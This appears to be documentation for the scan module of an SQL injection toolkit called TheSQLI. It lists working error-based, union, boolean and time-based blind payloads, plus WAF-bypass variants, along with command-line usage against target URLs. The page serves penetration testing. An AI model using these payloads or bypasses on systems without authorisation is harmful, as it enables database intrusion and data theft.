
# 📡 Scan Vulnerability Module

## Overview

The **Scan Vulnerability** module is the core of TheSQLI toolkit. It detects SQL injection vulnerabilities in target web applications using multiple detection techniques and risk levels.

--<img width="1113" height="608" alt="04 06 2026_10 02 49_REC" src="https://github.com/user-attachments/assets/78ec77b7-39a8-4ed0-8f9a-e54edf9b7897" />

## 🔧 How It Works

The module sends specially crafted payloads to each parameter in the target URL and analyzes responses for:

- **Error-based injection** → SQL syntax errors in response
- **Union-based injection** → Successful UNION SELECT statements
- **Boolean-based blind** → Response length/content differences
- **Time-based blind** → Response delays (SLEEP/BENCHMARK)

---

## 📊 Risk Levels

| Level | Name | Payload File | Description |
|-------|------|--------------|-------------|
| **1** | Ringan (Light) | `common_sqli.txt` | Basic error-based payloads only. Fast, low noise. |
| **2** | Medium | `common_sqli2.txt` | Extended payloads including time-based. Balanced. |
| **3** | Berat (Heavy) | `common_sqli3.txt` | Advanced WAF bypass, encoding, obfuscation. Aggressive. |

---

## 🎯 Detection Techniques

### 1. Error-Based Detection
```
Payload: 1' AND extractvalue(1,concat(0x7e,version()))-- -
Indicator: "XPATH syntax error" or "MySQL Query Error" in response
```

### 2. Union-Based Detection
```
Payload: -1' UNION SELECT 1,2,3-- -
Indicator: Numbers (1,2,3) appear in response
```

### 3. Boolean-Based Blind Detection
```
True:  1' AND 1=1-- -
False: 1' AND 1=2-- -
Indicator: Response length differs between true/false
```

### 4. Time-Based Blind Detection
```
Payload: 1' AND SLEEP(5)-- -
Indicator: Response takes 5+ seconds
```

---

## 📋 Output Format

When a vulnerability is found, the module outputs:

```
💀 VULNERABLE! Technique: error, DBMS: MySQL
Payload: 1' AND extractvalue(1,concat(0x7e,version()))-- -
```

### Result Table

| Column | Description |
|--------|-------------|
| Parameter | The vulnerable parameter name (e.g., `id`) |
| Status | `VULNERABLE` (red) or `AMAN` (green) |
| Teknik | Detection method (error/union/boolean/time) |
| DBMS | Database type (MySQL/PostgreSQL/MSSQL/Oracle) |

---

## 💻 Usage Examples

### Interactive Mode
```bash
python main.py
# Select module: 1
# Enter target URL: http://site.com/page.php?id=1
# Choose risk level: 3
```

### CLI Mode
```bash
# Basic scan (level 1)
python main.py -u "http://site.com/page.php?id=1" --scan

# Heavy scan (level 3)
python main.py -u "http://site.com/page.php?id=1" --scan --risk 3
```

---

## 🧪 Payload Examples by Risk Level

### Level 1 (Basic)
```
'
"
' OR '1'='1
' AND 1=1--
1' ORDER BY 1--
1' UNION SELECT NULL--
```

### Level 2 (Medium)
```
1' AND SLEEP(5)--
1' AND BENCHMARK(1000000,MD5('a'))--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
1' AND extractvalue(1,concat(0x7e,database()))--
```

### Level 3 (Advanced WAF Bypass)
```
1'/*!50000AND*/1=1--
1'%2527%20OR%20%25271%2527=%25271
1' O/**/R 1=1--
1'%0aAND%0a1=1--
1' AND (SELECT SLEEP(5) FROM DUAL WHERE '1'='1)--
```

---

## 🚦 Interpreting Results

### Vulnerable Found ✅
- Parameter is injectable
- Technique shown (use for enumeration)
- DBMS identified

### Not Vulnerable ❌
- No injection point detected
- Possible reasons:
  - Parameter not used in SQL query
  - WAF/IDS blocking payloads
  - Input sanitization enabled
  - Try higher risk level

---

## ⚙️ Technical Details

### Request Handler
- Timeout: 10 seconds (adjustable)
- User-Agent: Random browser string
- Follows redirects by default

### Detection Logic
1. Extract all GET parameters from URL
2. For each parameter, send baseline request
3. Test error-based payloads (fastest)
4. Test union-based (requires column detection)
5. Test boolean blind (length comparison)
6. Test time blind (delay detection)

### False Positives
- WAF returning custom error pages
- Application crashes triggering delays
- Network latency affecting time-based tests

---

## 🔧 Troubleshooting

| Problem | Solution |
|---------|----------|
| No parameters detected | Use URL with `?param=value` format |
| All parameters show "AMAN" | Try risk level 3 |
| Timeout errors | Increase timeout in `lib/requester.py` |
| WAF blocking requests | Use risk level 3 (bypass payloads) |
| Union detection failing | Target may need column count adjustment |

---

## 📚 Related Modules

- **Enumerate Databases** → Uses vulnerability info to list databases
- **Dump Database** → Extracts data from vulnerable parameter
- **Search Parameters** → Discovers hidden injection points

---

## ⚠️ Important Notes

- Always get permission before scanning
- Risk level 3 may trigger WAF alerts
- Some payloads may crash vulnerable applications
- Save results before testing aggressive payloads

---

<div align="center">
  <sub>Part of TheSQLI Toolkit - Professional Security Testing</sub>
</div>
